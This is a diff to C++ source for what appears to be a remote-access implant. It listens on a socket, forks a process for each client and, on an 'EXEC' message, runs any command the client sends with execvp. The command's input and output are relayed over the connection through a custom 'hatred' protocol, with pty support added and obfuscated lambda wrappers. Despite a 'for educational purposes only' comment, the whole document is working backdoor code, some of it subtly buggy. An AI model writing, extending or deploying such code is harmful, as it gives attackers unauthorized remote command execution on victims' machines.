@@ -1,3 +1,4 @@
+// decay range: 0xbd55, next: 0xbd55:4
 // for educational purposes only
 
 #include <charconv>
@@ -17,12 +18,14 @@
 #include <fcntl.h>
 #include <poll.h>
 #include <signal.h>
+#include <pty.h>
+
+#undef ECHO
 
 #include "../common/fnutil.h"
 #include "./ssdp.h"
 #include "../common/util.h"
 #include "./upnp.h"
-#include "./net.h"
 #include "./http.h"
 #include "./xml.h"
 #include "../proto/proto.h"
@@ -311,208 +314,235 @@ int main() {
         sockaddr  client_addr;
         socklen_t client_size = sizeof(sockaddr);
 
-        atexit(fnutil::decay<void(), 0xbd551>([&sock]{
-            if (sock != -1) {
-                shutdown(sock, SHUT_RDWR);
-                sock = -1;
-            }
-            DPRINTF("exit");
-        }));
+        std::vector<pid_t> children = {};
 
-        while (int client = accept(sock, &client_addr, &client_size)) {
-            if (client == -1) break;
-
-            proto::hatred_hdr msg;
-            while (client != -1 && proto::hatred_hdr::recv(client, msg) >= 0) {
-                DPRINTF("=== recv %i\n", msg.op);
-
-                if (proto::hatred_op(msg.op) == proto::hatred_op::ECHO) {
-                    proto::hatred_echo body;
-                    proto::hatred_echo::recv(client, body);
-
-                    proto::hatred_hdr{
-                        .op = (int)proto::hatred_op::ECHO
-                    }.send(client);
-                    
-                    proto::hatred_echo{
-                        .message = body.message
-                    }.send(client);
-                } else if (proto::hatred_op(msg.op) == proto::hatred_op::EXEC) {
-                    proto::hatred_exec body;
-                    proto::hatred_exec::recv(client, body);
-
-                    DPRINTF("exec \"%s\"\n", body.cmd.c_str());
-
-                    int stdinp[2];
-                    int stdoutp[2];
-                    int stderrp[2];
-
-                    if (pipe(stdinp) || pipe(stdoutp) || pipe(stderrp)) {
-                        DPERROR("pipe()");
-                        goto killcon;
+        bool alive = 1;
+        
+        struct sigaction oact = {};
+        struct sigaction act  = {};
+        sigemptyset(&act.sa_mask);
+        sigaddset(&act.sa_mask, SIGCHLD);
+        sigaddset(&act.sa_mask, SIGINT);
+        act.sa_handler = fnutil::decay<void(int), 0xbd553>([&](int a){
+            switch (a) {
+                case SIGCHLD:
+                    for (auto b = children.begin(); b != children.end(); ) {
+                        if (waitpid(*b, NULL, WUNTRACED | WNOHANG)) children.erase(b);
                     }
+                    break;
+                case SIGINT:
+#ifdef DEBUG
+                    shutdown(sock, SHUT_RDWR);
+                    sock = -1;
+                    exit(0);
+#endif
+                    break;
+            }
+        });
+        sigaction(SIGCHLD, &act, &oact);
+        sigaction(SIGINT, &act, &oact);
+        
+        int client;
+        while (alive && (client = accept(sock, &client_addr, &client_size))) {
+            if (client == -1) {
+                switch (errno) {
+                    case EINTR:
+                        DPRINTF("interrupted\n");
+                        continue;
+                    default: break;
+                }
+            };
 
-                    if (pid_t cpid = fork()) {
-                        if (cpid == -1) {
-                            DPERROR("fork()");
-                            
-                            proto::hatred_hdr{
-                                .length = 0,
-                                .op = (int)proto::hatred_op::CLOSE
-                            }.send(client);
+            if (pid_t chpid = fork()) {
+                children.push_back(chpid);
+            } else {
+        
+                proto::hatred_hdr msg;
+                while (client != -1 && proto::hatred_hdr::recv(client, msg) >= 0) {
+                    DPRINTF("=== recv %i\n", msg.op);
 
-                            close(stdinp[0]);
-                            close(stdinp[1]);
-                            close(stdoutp[0]);
-                            close(stdoutp[1]);
-                            close(stderrp[0]);
-                            close(stderrp[1]);
-                            
+                    if (proto::hatred_op(msg.op) == proto::hatred_op::ECHO) {
+                        proto::hatred_echo body;
+                        proto::hatred_echo::recv(client, body);
+
+                        proto::hatred_hdr{
+                            .op = (int)proto::hatred_op::ECHO
+                        }.send(client);
+                        
+                        proto::hatred_echo{
+                            .message = body.message
+                        }.send(client);
+                    } else if (proto::hatred_op(msg.op) == proto::hatred_op::EXEC) {
+                        proto::hatred_exec body;
+                        proto::hatred_exec::recv(client, body);
+
+                        int stdinp[2];
+                        int stdoutp[2];
+                        int stderrp[2];
+
+                        if (pipe(stdinp) || pipe(stdoutp) || pipe(stderrp)) {
+                            DPERROR("pipe()");
                             goto killcon;
                         }
-
-                        FILE* pstdin  = fdopen(stdinp[1], "w");
-                        FILE* pstdout = fdopen(stdoutp[0], "r");
-                        FILE* pstderr = fdopen(stderrp[0], "r");
-                        FILE* cstdin  = fdopen(stdinp[0], "r");
-                        FILE* cstdout = fdopen(stdoutp[1], "w");
-                        FILE* cstderr = fdopen(stderrp[1], "w");
-
-                        setvbuf(pstdout, 0, _IONBF, 0);
-                        setvbuf(pstderr, 0, _IONBF, 0);
-                        setvbuf(cstdout, 0, _IONBF, 0);
-                        setvbuf(cstderr, 0, _IONBF, 0);
-
-                        pollfd streams[4] = {
-                            {
-                                .fd = stdinp[1],
-                                .events = POLLRDHUP
-                            },
-                            {
-                                .fd = stdoutp[0],
-                                .events = POLLIN | POLLRDHUP
-                            },
-                            {
-                                .fd = stderrp[0],
-                                .events = POLLIN | POLLRDHUP
-                            },
-                            {
-                                .fd     = client,
-                                .events = POLLIN | POLLRDHUP
-                            }
-                        };
-
-                        DPRINTF("start accepting child io\n");
-
-
-                        struct sigaction oact = {};
-                        struct sigaction act  = {};
-                        act.sa_flags = 0;
-                        act.sa_handler = fnutil::decay<void(int), 0xbd552>([&](int a){
-                            if (cpid != -1) waitpid(cpid, 0, WUNTRACED);
-                            close(client);
-                            client = -1;
-                            cpid = -1;
-                            sigaction(SIGCHLD, &oact, NULL);
-                        });
                         
-                        sigaction(SIGCHLD, &act, &oact);
-                        
-                        while (poll(streams, 4, 1000) != -1) {
-                            if ((streams[0].revents | streams[1].revents | streams[2].revents | streams[3].revents) & (POLLHUP | POLLERR | POLLRDHUP)) {
-                                break;
-                            }
-
-                            if (streams[1].revents & POLLIN) {
-                                char buf[128] = {};
-                                int read = ::read(stdoutp[0], buf, 128);
+                        int master;
+                        if (pid_t cpid = forkpty(&master, NULL, NULL, NULL)) {
+                            if (cpid == -1) {
+                                DPERROR("fork()");
                                 
-                                fprintf(stdout, "STDOUT ===\n%s\n===", buf);
-
                                 proto::hatred_hdr{
                                     .length = 0,
-                                    .op = (int)proto::hatred_op::STREAM
+                                    .op = (int)proto::hatred_op::CLOSE
                                 }.send(client);
 
-                                proto::hatred_stream{
-                                    .fno = 1,
-                                    .data = std::string(buf)
-                                }.send(client);
+                                close(stdinp[0]);
+                                close(stdinp[1]);
+                                close(stdoutp[0]);
+                                close(stdoutp[1]);
+                                close(stderrp[0]);
+                                close(stderrp[1]);
+                                
+                                goto killcon;
                             }
 
-                            if (streams[2].revents & POLLIN) {
-                                char buf[128] = {};
-                                int read = ::read(stderrp[0], buf, 128);
-                                //fprintf(stdout, "STDERR ===\n%s\n===", buf);
+                            FILE* pstdin  = fdopen(stdinp[1], "w");
+                            FILE* pstdout = fdopen(stdoutp[0], "r");
+                            FILE* pstderr = fdopen(stderrp[0], "r");
+                            FILE* cstdin  = fdopen(stdinp[0], "r");
+                            FILE* cstdout = fdopen(stdoutp[1], "w");
+                            FILE* cstderr = fdopen(stderrp[1], "w");
 
-                                proto::hatred_hdr{
-                                    .length = 0,
-                                    .op = (int)proto::hatred_op::STREAM
-                                }.send(client);
+                            setvbuf(pstdout, 0, _IONBF, 0);
+                            setvbuf(pstderr, 0, _IONBF, 0);
+                            setvbuf(cstdout, 0, _IONBF, 0);
+                            setvbuf(cstderr, 0, _IONBF, 0);
 
-                                proto::hatred_stream{
-                                    .fno = 1,
-                                    .data = std::string(buf)
-                                }.send(client);
-                            }
+                            pollfd streams[4] = {
+                                {
+                                    .fd = stdinp[1],
+                                    .events = POLLRDHUP
+                                },
+                                {
+                                    .fd = stdoutp[0],
+                                    .events = POLLIN | POLLRDHUP
+                                },
+                                {
+                                    .fd = stderrp[0],
+                                    .events = POLLIN | POLLRDHUP
+                                },
+                                {
+                                    .fd     = client,
+                                    .events = POLLIN | POLLRDHUP
+                                }
+                            };
 
-                            if (streams[3].revents & POLLIN) {
-                                proto::hatred_hdr    header;
-                                proto::hatred_hdr::recv(client, header);
+                            struct sigaction oact = {};
+                            struct sigaction act  = {};
+                            sigemptyset(&act.sa_mask);
+                            sigaddset(&act.sa_mask, SIGCHLD);
+                            act.sa_handler = fnutil::decay<void(int), 0xbd552>([&](int a){
+                                if (cpid != -1) waitpid(cpid, 0, WUNTRACED);
+                                close(client);
+                                client = -1;
+                                cpid = -1;
+                                sigaction(SIGCHLD, &oact, NULL);
+                            });
+                            
+                            sigaction(SIGCHLD, &act, &oact);
+                            
+                            while (poll(streams, 4, 1000) != -1) {
+                                if ((streams[0].revents | streams[1].revents | streams[2].revents | streams[3].revents) & (POLLHUP | POLLERR | POLLRDHUP)) {
+                                    break;
+                                }
 
-                                proto::hatred_stream body;
-                                proto::hatred_stream::recv(client, body);
+                                if (streams[1].revents & POLLIN) {
+                                    char buf[128] = {};
+                                    int read = ::read(stdoutp[0], buf, 128);
+                                    
+                                    fprintf(stdout, "STDOUT ===\n%s\n===", buf);
 
-                                if (body.fno == 0) {
-                                    ::write(stdinp[1], body.data.c_str(), body.data.length());
+                                    proto::hatred_hdr{
+                                        .length = 0,
+                                        .op = (int)proto::hatred_op::STREAM
+                                    }.send(client);
+
+                                    proto::hatred_stream{
+                                        .fno = 1,
+                                        .data = std::string(buf)
+                                    }.send(client);
+                                }
+
+                                if (streams[2].revents & POLLIN) {
+                                    char buf[128] = {};
+                                    int read = ::read(stderrp[0], buf, 128);
+                                    fprintf(stdout, "STDERR ===\n%s\n===", buf);
+
+                                    proto::hatred_hdr{
+                                        .length = 0,
+                                        .op = (int)proto::hatred_op::STREAM
+                                    }.send(client);
+
+                                    proto::hatred_stream{
+                                        .fno = 1,
+                                        .data = std::string(buf)
+                                    }.send(client);
+                                }
+
+                                if (streams[3].revents & POLLIN) {
+                                    proto::hatred_hdr    header;
+                                    proto::hatred_hdr::recv(client, header);
+
+                                    proto::hatred_stream body;
+                                    proto::hatred_stream::recv(client, body);
+
+                                    if (body.fno == 0) {
+                                        ::write(stdinp[1], body.data.c_str(), body.data.length());
+                                    }
                                 }
                             }
-                        }
 
-                        DPRINTF("kill child\n");
-
-                        if (cpid > 0) {
-                            if (kill(cpid, SIGTERM)) {
-                                DPERROR("kill");
-                            } else {
-                                sleep(1);
-                                if (cpid != -1) kill(cpid, SIGKILL);
+                            sigaction(SIGCHLD, &oact, NULL);
+                            if (cpid != -1) {
+                                kill(cpid, SIGKILL);
+                                waitpid(cpid, 0, WUNTRACED);
+                                cpid = -1;
                             }
-                            waitpid(cpid, 0, WUNTRACED);
+
+                            fclose(cstdin); 
+                            fclose(cstdout);
+                            fclose(cstderr);
+                            fclose(pstdin);
+                            fclose(pstdout);
+                            fclose(pstderr);
+                        } else {
+                            const char** argv = (const char**)malloc(sizeof(char*) * (body.args.size() + 2));
+                            argv[body.args.size() + 1] = 0;
+                            argv[0] = body.cmd.c_str();
+                            for (int i = 0; i < body.args.size(); i++) {
+                                argv[i + 1] = body.args[i].c_str();
+                            }
+
+                            dup2(stdinp[0], 0);
+                            dup2(stdoutp[1], 1);
+                            dup2(stderrp[1], 2);
+
+                            execvp(body.cmd.c_str(), (char*const*)argv);
+                            
+                            exit(0);
                         }
+                    } 
+                }
 
-                        fclose(cstdin); // hopefully this will kill the child
-                        fclose(cstdout);
-                        fclose(cstderr);
-                        fclose(pstdin);
-                        fclose(pstdout);
-                        fclose(pstderr);
-                    } else {
-                        const char** argv = (const char**)malloc(sizeof(char*) * (body.args.size() + 2));
-                        argv[body.args.size() + 1] = 0;
-                        argv[0] = body.cmd.c_str();
-                        for (int i = 0; i < body.args.size(); i++) {
-                            argv[i + 1] = body.args[i].c_str();
-                        }
+                killcon: if (client != -1) {
+                    close(client);
+                    client = -1;
+                }
 
-                        dup2(stdinp[0], 0);
-                        dup2(stdoutp[1], 1);
-                        dup2(stderrp[1], 2);
+                client_size = sizeof(sockaddr);
+                memset(&client_addr, 0, client_size);
 
-                        execvp(body.cmd.c_str(), (char*const*)argv);
-                        
-                        exit(0);
-                    }
-                } 
+                exit(0);
             }
-
-killcon:    if (client != -1) {
-                close(client);
-                client = -1;
-            }
-
-            client_size = sizeof(sockaddr);
-            memset(&client_addr, 0, client_size);
 
             DPRINTF("accepting clients\n");
         }
